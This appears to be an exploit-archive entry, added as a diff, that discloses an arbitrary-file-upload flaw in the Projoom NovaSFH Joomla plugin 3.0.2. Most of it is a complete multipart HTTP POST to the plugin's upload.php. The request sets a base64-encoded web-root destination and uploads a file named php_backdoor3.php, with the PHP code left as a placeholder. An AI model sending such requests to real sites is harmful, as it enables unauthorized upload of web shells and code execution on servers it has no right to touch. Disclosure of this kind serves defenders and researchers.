@@ -1,0 +1,36 @@
+source: http://www.securityfocus.com/bid/65438/info
+
+Projoom NovaSFH plugin for Joomla! is prone to an arbitrary-file-upload vulnerability because it fails to adequately sanitize user-supplied input.
+
+An attacker may leverage this issue to upload arbitrary files; this can result in arbitrary code execution within the context of the vulnerable application.
+
+Projoom NovaSFH Plugin 3.0.2 is vulnerable; other versions may also be affected. 
+
+POST /administrator/components/com_novasfh/views/upload.php?action=upload&dest=L3Zhci93d3cvaHRtbA== HTTP/1.1
+Host: <IP>
+Proxy-Connection: keep-alive
+Content-Length: 513
+Origin: <originl>
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.95 Safari/537.36
+Content-Type: multipart/form-data; boundary=----------ae0cH2Ij5ei4ei4Ef1Ij5Ij5ae0cH2
+Accept: */*
+DNT: 1
+Referer: http://<host>/administrator/index.php?option=com_novasfh&c=uploader
+Accept-Encoding: gzip,deflate,sdch
+Accept-Language: en-US,en;q=0.8
+
+------------ae0cH2Ij5ei4ei4Ef1Ij5Ij5ae0cH2
+Content-Disposition: form-data; name="Filename" 
+
+php_backdoor.php
+------------ae0cH2Ij5ei4ei4Ef1Ij5Ij5ae0cH2
+Content-Disposition: form-data; name="Filedata"; filename="php_backdoor3.php" 
+Content-Type: application/octet-stream
+
+[PHP_CODE]
+
+------------ae0cH2Ij5ei4ei4Ef1Ij5Ij5ae0cH2
+Content-Disposition: form-data; name="Upload" 
+
+Submit Query
+------------ae0cH2Ij5ei4ei4Ef1Ij5Ij5ae0cH2--
